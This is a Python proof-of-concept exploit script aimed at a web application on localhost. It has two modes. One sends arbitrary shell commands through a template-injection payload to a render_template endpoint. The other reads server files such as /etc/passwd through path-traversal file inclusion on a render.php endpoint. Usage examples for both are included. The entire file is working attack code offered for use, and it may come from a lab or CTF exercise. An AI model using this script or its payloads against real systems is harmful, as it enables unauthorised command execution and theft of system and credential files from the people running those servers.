#!/usr/bin/env python3
import requests
import sys

# ---------------------------------------------------------------------------
# PoC Exploit Script
#
# Features:
#   [1] Remote Code Execution via template injection:
#           POST /api.php?action=render_template
#           template={{ <shell command> }}
#
#   [2] Local File Inclusion:
#           GET /api/render.php?page=../../../../etc/passwd
#
# Adjust TARGET_WEB and TARGET_API to match your environment.
# ---------------------------------------------------------------------------

TARGET_TEMPLATE = "http://localhost:8080/api.php?action=render_template"
TARGET_LFI      = "http://localhost:8080/api/render.php"


# =============================
#      R C E    E X P L O I T
# =============================
def exploit_rce(cmd):
    print("[*] Triggering RCE via vulnerable template engineâ€¦")

    # Template RCE payload
    payload = f"{{{{ {cmd} }}}}"

    try:
        r = requests.post(TARGET_TEMPLATE, data={"template": payload})
    except Exception as e:
        print("[!] Request error:", e)
        return

    print("\n[+] Server response:\n")
    print(r.text.strip() or "(no output)")


# =============================
#      L F I   E X P L O I T
# =============================
def exploit_lfi(filepath):
    print(f"[*] Reading remote file via LFI: {filepath}")

    try:
        r = requests.get(TARGET_LFI, params={"page": filepath})
    except Exception as e:
        print("[!] Request error:", e)
        return

    print("\n[+] File content:\n")
    print(r.text or "(empty file)")


# =============================
#           M A I N
# =============================
def main():
    if len(sys.argv) < 3:
        print("Usage:")
        print("  python3 exp.py rce \"<command>\"")
        print("  python3 exp.py lfi \"<path>\"")
        print("\nExamples:")
        print("  python3 exp.py rce \"id\"")
        print("  python3 exp.py lfi \"../../../../etc/passwd\"")
        sys.exit(1)

    mode = sys.argv[1].lower()

    if mode == "rce":
        exploit_rce(sys.argv[2])
    elif mode == "lfi":
        exploit_lfi(sys.argv[2])
    else:
        print("Unknown mode:", mode)
        print("Use: rce or lfi")


if __name__ == "__main__":
    main()
